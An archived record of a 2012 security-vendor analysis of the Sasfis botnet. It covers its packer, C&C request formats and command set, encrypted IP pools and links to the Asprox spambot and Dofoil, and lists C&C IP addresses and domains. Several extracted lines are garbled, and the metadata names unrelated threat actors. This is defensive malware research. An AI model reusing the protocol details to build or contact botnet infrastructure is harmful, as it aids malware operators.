{
    "id": "9020184a-d03a-43c6-9574-b96f21af6002",
    "created_at": "2023-01-12T15:00:04.577626Z",
    "updated_at": "2025-03-27T02:12:11.066352Z",
    "deleted_at": null,
    "sha1_hash": "23942def1fe2bfb0a42e505ef422c47060f51d29",
    "title": "2012-11-01 - Tracking the 2012 Sasfis campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T17:47:13Z",
    "file_modification_date": "2022-05-28T17:47:13Z",
    "file_size": 475646,
    "plain_text": "# Tracking the 2012 Sasfis campaign\n\n**virusbulletin.com/virusbulletin/2012/11/tracking-2012-sasfis-campaign**\n\n2012-11-01\n\n### Micky Pun\n\nFortinet, Canada Editor: Helen Martin\n**Abstract**\n\nMicky Pun unveils all the important nuts and bolts of the latest instalment of the Sasfis botnet by analysing its packers, core payloads and\nbotnet operations.\n\nResearchers at Fortinet have been tracking the Sasfis malware campaign since a surge of new samples surfaced in late May 2012. By early\nAugust, the Sasfis botnet had already undergone five major changes. In this article we will unveil all the important nuts and bolts of the latest\ninstalment of the Sasfis botnet by analysing its packers, core payloads and botnet operations (including its relationship with the Asprox\nspambot). We will also discuss its connection with the Dofoil campaign, which was highly active until the rise of the new Sasfis botnet.\n\n## Sample delivery\n\nFrom the samples we have collected since May, it is evident that the Asprox spambot is used by Sasfis as its sole spreading mechanism.\nCarrying on its tradition, Asprox initially used the name of a trusted delivery company as the bait to trick users into opening an executable\nemail attachment with a document icon. In early August, however, it was observed that the spam had been improved by replacing the email\ncontent with an image containing the same text. The image (Figure 1) encourages the user to click on it – in doing so downloading another\nmalicious executable with a document icon. After executing the file, the payload deletes the executable and opens a blank text file in Notepad\nat the current location to divert the user’s attention. These changes provide some benefits to Asprox in that the malware sample is no longer\nattached to the spam (which previously could easily be blocked by firewalls with up-to-date malware definitions). In addition, storing the\nmalware online makes the botnet operation more dynamic and effective; rapid replacement of the sample makes effective sample collection\ndifficult and hence challenges anti-virus vendors that use checksum-based detection.\n\n**Figure 1. New Asprox spam with picture linked to the malicious attachment stored online.**\n\n## Packer\n\nThe new Sasfis is packed with a custom packer which releases a DLL PE file into memory. While unpacking the malware, you will notice that\nthe initial part of the custom packer consists of obfuscating instructions, sometimes combined with anti-debug or anti-virtual-environment\ntechniques that aim to make it difficult for humans or emulators to determine the start of the malicious code.\n\nAfter successfully unpacking the custom packer, we find in the allocated memory a payload DLL wrapped in a DLL loader, which in turn is\nwrapped in a decoder (illustrated in Figure 2).\n\n\n-----\n\n**Figure 2. The structure of Sasfis samples.**\n\nThe injection technique that is used in the DLL loader is rather new and had not been seen until the Dofoil campaign last year. (We will discuss\nthe relationship between the 2012 Sasfis campaign and Dofoil later in the article.) It is also worth mentioning that some of the custom packers\nused by Sasfis were found to be identical to the packers being used for packing the Andromeda botnet client – however, a discussion of\nAndromeda is outside the scope of this article.\n\n## Payload\n\nThe payload of Sasfis acts as a listening client in the botnet operation. It does not have a predefined task and only listens for commands that\nare issued by the C&C server. The traffic that would be accepted by the C&C server is described below:\n```\n[C&C server URL]/forum/index.php?r=gate&id=XXXXXXX&group=XXXXX&debug=0\n\n```\nAnd in later versions (appeared on 23 July):\n```\n[C&C server URL]/forum/index.php?r=gate&id=XXXXXXX&group=XXXXX&debug=0&ips=XXX\n\n```\nAnd when the host has been infected more than once in the later edition (first appeared on 6 August) the following traffic pattern will appear:\n```\n[C&C server URL]/forum/index.php?r=gate/getipslist&id=XXXXXXX\n\n```\nwhere:\n\n**id is the volume serial number that can be used as the unique identity of the running machine**\n\n**group is used by the C&C server to identify the running version of the botnet (this will be discussed further in the ‘botnet operation’**\nsection)\n\n**ips is the local IP of the botnet client (for collecting data on local network topology).**\n\nThe first two request formats will allow the client to make contact with the C&C server. The third request format is used for getting a new IP list\nof ‘possible’ C&C servers. In addition, the second and third request formats will be encrypted in the TCP traffic by RC4 with the volume serial\nnumber as a key.\n```\nhttp://[IP derived from IP List]:[Port from the IPList]/[RC4 key]index.php?r=gate&id=[Volume serial Number]\n&group=[groupID]&debug=0&ips=[local IP]\n\n```\nFor example:\n\nIf the randomly chosen server is determined as 62.75.163.172 with port 84 from the IP list, the following line shows what the request looks like\nbefore encryption:\n```\nhttp://62.75.163.172:84/ac197b68index.php?r=gate&id=ac197b68&group=n1308rcm&debug=0&ips=192.168.153.130\n\n```\nAfter encrypting the later part with the key using RC4, the hex value of the result will be converted to an ASCII string and attached to the\nrequest expression as indicated below:\n```\nhttp://62.75.163.172:84/ac197b68988846E47A0F7C6C39E74966287DD0049B32136C54EA07AE3C6FDDC1E58A1CC6DF1D34128\n63B821669AF61F182A561F7C7610AA15965570F6A4CF5AE1CA2EA30169A70FD08FE430D\n\n```\nWh t i t t C&C f diff t ki d f b i d b th li t Fi 3\n\n\n-----\n\n**Figure 3. When a request is sent to a C&C server, a few kinds of responses may be received by the client.**\n\nThe traffic captured by Wireshark demonstrates two possible replies from the C&C server (c=run and c=rdl) in response to the same request\nmessage. Table 1 summarizes all the responses that can be accepted and interpreted by the client.\n\n**C&C server**\n**command** **Format** **Parameters**\n\nDownload and run c=run&u=%1024s u = URL\n\nRemove C=rem N/A\n\n\nDownload, decrypt and\nrun (with open to\nregister and drop)\n\n\n\n[older Version]\nc=rdl&u=%1024[^&]&a=%x&k=%x [newer\nversion]\nc=rdl&u=%1024[^&]&a=%x&k=%x&n=%1024s\n\n\nu = URL,a = autorun flag where a = 1 means the file will be\nstored in the system and autorun will be set up, k = encryption\nkey, n = name for the downloaded file\n\n\nIdle c=idl N/A\n\n\nRename download at\nregistry\n\n\nc=red&n=%1024s n = name of the downloaded file\n\n\nUpdate c=upd&u=%1024s U = URL of the replacement botnet client\n\n**Table 1. Commands accepted by Sasfis client.**\n\nFor better malicious file management on infected hosts, Sasfis has a set of rules to keep track of the downloaded items. For example, when a\nmalicious executable such as FakeAV is downloaded through use of the c=rdl command, a registry entry will be created related to this\ndownloaded file stored in the file system (Figure 4). The entry will be encrypted with a key either generated by some API function or simply by\na hard-coded constant. When the Sasfis client wants to retrieve infomation regarding the downloaded files, it will iterate through the all keys in\nHKEY_CURRENT_USER/SOFWARE and XOR the first 16 digits of the registry data (e.g. /0x09/0x18/0x28/0x95/0x5F/0x19/0x2F/0x94/0x58)\nwith its own key (e.g. VolumeSerialNumber = ‘AC197b68’ and equalivant to ‘/0x68/0x7b/0x97/0xAC’ in hex). The registry entry will be valid if\nthe result is equal to the ASCII value of the key itself (‘AC197b68’ which is /0x61/0x63/0x31/0x39/0x37/0x62/0x36/0x38 in hex). The rest of the\nregistry data after decryption is shown in Figure 5. Following the ASCII value of the key, the next eight bytes are the key for decrypting the\ndownloaded file stored at %APPDATA% with the lename specied in the last eight bytes of data. The lename ‘svdll’ in Figure 5 is used for\nidentifying the downloaded object, the server command ‘c=red&%1024s’ allows this name to be modied.\n\n\n-----\n\n**Figure 4. Registry of a host infected by Sasfis.**\n\n**Figure 5. Registry data reveals information after decryption (XOR with DWORD key).**\n\nAnother encrypted part of the payload is the C&C server address. In the newer versions, when the command ‘getipsList’ is requested, an IP list\nwill be downloaded in the following structure:\n```\nStruct IP_LIST_ENTRY\n{\n   DWORD C&C_IP\n   WORD C&C_Port_number\n}\nStruct IP_LIST\n{\nNUMBER_OF_ENTRY = list length / 6\nIP_LIST_ENTRY[NUMBER_OF_ENTRY]\n}\n\n```\nThe IP list is encrypted with RC4 and the client will randomly choose one C&C IP for each request. Rather than the entire IP pool being\ndecrypted and revealed in the dynamic memory, only the chosen C&C IP entry is decrypted using RC4. Figure 6 shows the location of the\ndecryption method in the payload, the ‘default’ IP pool and hard-coded decryption key location. Figure 7 summarizes the IP pool decryption\nmethod.\n\n**Figure 6. Location of the IP pool being decrypted.**\n\n**Figure 7. IP pool decryption method.**\n\n[(For a larger version of Figure 7 please click here.)](https://www.virusbulletin.com/uploads/images/figures/2012/11/Sasfis-7-large.jpg)\n\n\n-----\n\n## Downloads\n\nOnce it has registered itself on the C&C server, the Sasfis client will keep polling the server for possible downloads until it is no longer\navailable. The downloaded files include the Asprox spambot (Dammec), a wide variety of password stealers (usually identified as Grabberz),\nand FakeAV. The Asprox spambot will download a template containing email recipients, the email content, and the attachment or link to\ndownload the attachment. FakeAV is downloaded as a pay-per-install element which allows the botnet owner to generate income. The traffic\nshows that a response will be sent back to another server to give notice that FakeAV has been run.\n\n## Botnet operation\n\nFigure 8 presents the major changes seen in the Sasfis network since its first discovery. From the timeline, we can see that Sasfis is a growing\nbotnet with increasing functionality and complexity. The groupID is most likely the date when the sample was produced. Through our study of\nan active Sass botnet, we noticed that the uptime of new C&C servers has decreased from an average of one week in May to an average of\none to two days in September. This decreasing trend could be explained by the fact that the botnet has already been operating for a few\nmonths and it might have reached a point when it has established an optimal number of spambots to keep the botnet growing. In addition, the\nrapid change of botnet server indicated that the operator has been shifting focus from infecting more computers to preserving the existing\ninfected hosts. By using a pool of malicious IP server addresses to create dynamic traffic, the botnet operator attempts to avoid over exposure\nof his malicious IPs (which could lead to being blocked by security products). The ‘get IP list’ command, which is triggered by a reinfection\ncondition, reinforces this goal by rapidly exchanging the IP pool.\n\n**Figure 8. Timeline of Sasfis development since May 2012.**\n\nPerhaps one of the most significant differences between this year’s Sasfis and older versions was its integration with Asprox. Traditionally, the\nAsprox spambot was hosted on different IPs separated from the Sasfis botnet. However, in the 2012 Sasfis samples (from the beginning of\nAugust when the IP list was used to replace the malicious domain list), we observed that the same pool of IP addresses was being used by\nboth Asprox C&C servers (for keep-alive messages) and the Sasfis C&C servers. We indentified identical IPs in the Asprox spam template\n(Listing 1) and Sasfis samples (Listing 2).\n```\n<s>114.202.247.182:84\n173.230.131.168:84\n188.138.95.133:84\n195.210.47.109:80\n203.130.129.58:84\n209.20.78.241:84\n68.173.180.226:84\n72.55.174.23:84\n74.208.73.243:84\n77.81.225.253:84\n86.126.42.121:84\n95.131.66.34:84\nloftgun01.ru\npostbox901.ru\nsbolt71.ru\nslopokan21.ru\nteranian111.ru</s>\nListing 1: Asprox template downloaded from http://24.106.225.182:80 at 2012-09-07 06:32:47 with sample \n8cbfaf6f0334b993f0a69b70fcaea6a2.\n\n```\n\n-----\n\n```\n72.55.174.23:84\n74.208.73.243:84\n114.202.247.182:84\n209.20.78.241:84\n203.130.129.58:84\n188.138.95.133:84\n77.81.225.253:84\n173.230.131.168:84\n95.131.66.34:84\n79.52.163.227:80\nListing 2: Default C&C IP pool decoded from sample 8cbfaf6f0334b993f0a69b70fcaea6a2.\n\n```\nComparing the IPs we acquired from the previous sample with the traffic we collected at around the time when this sample was collected\n(Table 2), it is clear that the pool of IPs we got from Listings 1 and 2 is just a small subset of the IP pools that are used for the C&C and Asprox\nserver pool as very few identical IPs were observed. This has made tracking down the entire botnet very difficult because of how the botnet\n‘branches out’ and becomes dynamic. The introduction of the IP pool has added an element of randomness to the botnet’s growth and creates\na nightmare for sample replication.\n\n**Access time** **IP address** **Downloaded item**\n\n07/09/2012 14:47 http://74.73.102.189:80 Asprox spam template\n\n07/09/2012 14:28 http://71.95.37.67:80 Asprox spam template\n\n07/09/2012 14:01 http://46.7.249.50:80 Asprox spam template\n\n07/09/2012 13:49 http://74.72.186.201:80 Asprox spam template\n\n07/09/2012 13:42 http://24.10.137.97:80 Asprox spam template\n\n07/09/2012 13:03 http://71.95.37.67:80 Asprox spam template\n\n07/09/2012 12:38 http://203.255.53.189:84 Asprox spam template\n\n07/09/2012 12:33 http://24.43.106.9:80 Asprox spam template\n\n07/09/2012 11:15 http://203.255.53.189:84 Asprox spam template\n\n07/09/2012 11:10 http://24.43.106.9:80 Asprox spam template\n\n07/09/2012 10:59 http://79.52.163.227:80 Asprox spam template\n\n07/09/2012 10:32 http://81.88.152.239:80 Asprox backup C&C\n\n07/09/2012 10:23 http://158.181.226.124:80 Asprox backup C&C\n\n07/09/2012 9:49 http://46.7.249.50:80 Asprox spam template\n\n07/09/2012 9:49 http://68.149.67.42:80 Asprox spam template\n\n07/09/2012 9:42 http://158.181.226.124:80 Asprox backup C&C\n\n07/09/2012 9:40 http://98.26.184.1:80 Asprox spam template\n\n07/09/2012 9:01 http://158.181.226.124:80 Asprox backup C&C\n\n07/09/2012 8:21 http://158.181.226.124:80 Asprox backup C&C\n\n07/09/2012 7:47 http://68.149.67.42:80 Asprox spam template\n\n07/09/2012 7:40 http://158.181.226.124:80 Asprox backup C&C\n\n07/09/2012 7:08 http://81.88.152.239:80 Asprox spam template\n\n07/09/2012 6:59 http://158.181.226.124:80 Asprox backup C&C\n\n07/09/2012 6:55 http://74.72.186.201:80 Asprox spam template\n\n07/09/2012 6:32 http://24.106.225.182:80 Asprox spam template\n\n**Table 2. Traffic collected since three hours before the Asprox template was downloaded.**\n\n## Relationship with Dofoil\n\n\n-----\n\nu g t e p ocess o u pac g Sas s a d ts a ate do oaded te, a e, e d sco e ed t at t ese sa p es bot use t e o d o\nas one of the names of an important export function which contains the malicious routine. Looking back at the Dofoil samples we collected\nbetween last year and the beginning of this year, we also observed that the word ‘work’ was revealed during the process of unpacking, marking\nthe location of the payload. There is also a striking resemblance between the injection techniques used by Sasfis and Dofoil. The injection\ntechnique provides a way to release the malicious code to a section and attach it to a suspended legitimate window process. The malicious\ncode will be executed when the process is resumed in the end. Since this technique is not common in other malware, these similarities\nstrongly suggest that Sasfis and Dofoil are the work of the same group of authors. Our suspicions were further confirmed by the traffic record\nwe have collected. The history (Table 3) in our system provides evidence that the Dofoil campaign left the cybercrime scene in early May, and\nthe Sasfis campaign stepped in half a month later with the same server (same IP) under a new hostname.\n\n\n**From C&C server**\n\n\n**Entry**\n**date** **Request content** **Reply content**\n\n\nbeaufortseaa139.ru/\n213.152.180.178\n\n\n201205-10\n\n\nGET /aaa/index.php?\nwFoAAACjraT9p6W0rK+hpOasr6eprv3y9/KC8ob5+fP2hPOGhvPw+YPz8PDx8YKG\n(*after decryption it will be revealed as /aaa/index.php?cmd=\nload&xxxxxxxxxxxxxxxxxxxxxxxxxx)\n\n\n302 FOUND http://xxxxxxxx\n\n\nkrasguatanany.ru/\n213.152.180.178\n\n\n201205-31\n\n\nGET /gley/index.php?r=gate&id=xxxxxxxx&group=30.05.2012&debug=0 c=rdl&u=http://krasguatanan\n\n\n**Table 3. Botnet information collected by our system.**\n\nThere is also an interesting observation about these two botnets. Though their request parameters resonate with one another, the two are\nactually at opposite ends of the botnet category, that is, Dofoil has a predefined ‘task’ that is hard-coded in the client, while Sasfis relies on\ncommands from the C&C server to perform tasks.\n\n## Conclusion\n\nWe have concluded that there is a strong relationship between Sasfis and Dofoil. Through our comparison, it is apparent that the new Sasfis\nhas many major improvements when compared to its older counterpart. As of today, the Sasfis 2012 campaign remains active because of its\nstrong custom packer and we would probably expect more ‘features’ to become available in the near future.\n\n## Latest articles:\n\n### Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency\n\nTeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations’ dedicated environments\nand transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by…\n\n### Collector-stealer: a Russian origin credential and information extractor\n\nCollector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and\nstore it in its C&C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360…\n\n### Fighting Fire with Fire\n\nIn 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the\nproperties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly…\n\n### Run your malicious VBA macros anywhere!\n\nKurt Natvig wanted to understand whether it’s possible to recompile VBA macros to another language, which could then easily be ‘run’ on any\ngateway, thus revealing a sample’s true nature in a safe manner. In this article he explains how he recompiled…\n\n### Dissecting the design and vulnerabilities in AZORult C&C panels\n\nAditya K Sood looks at the command-and-control (C&C) design of the AZORult malware, discussing his team's findings related to the C&C\ndesign and some security issues they identified during the research.\n\n[Bulletin Archive](https://www.virusbulletin.com/virusbulletin/archive)\n\n\n-----\n\n_Copy g t ©_ _0_ _us_ _u et_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2012/2012-11-01 - Tracking the 2012 Sasfis campaign.pdf"
    ],
    "report_names": [
        "2012-11-01 - Tracking the 2012 Sasfis campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535604,
    "ts_updated_at": 1743041531,
    "ts_creation_date": 1653760033,
    "ts_modification_date": 1653760033,
    "files": {
        "pdf": "https://archive.orkl.eu/23942def1fe2bfb0a42e505ef422c47060f51d29.pdf",
        "text": "https://archive.orkl.eu/23942def1fe2bfb0a42e505ef422c47060f51d29.txt",
        "img": "https://archive.orkl.eu/23942def1fe2bfb0a42e505ef422c47060f51d29.jpg"
    }
}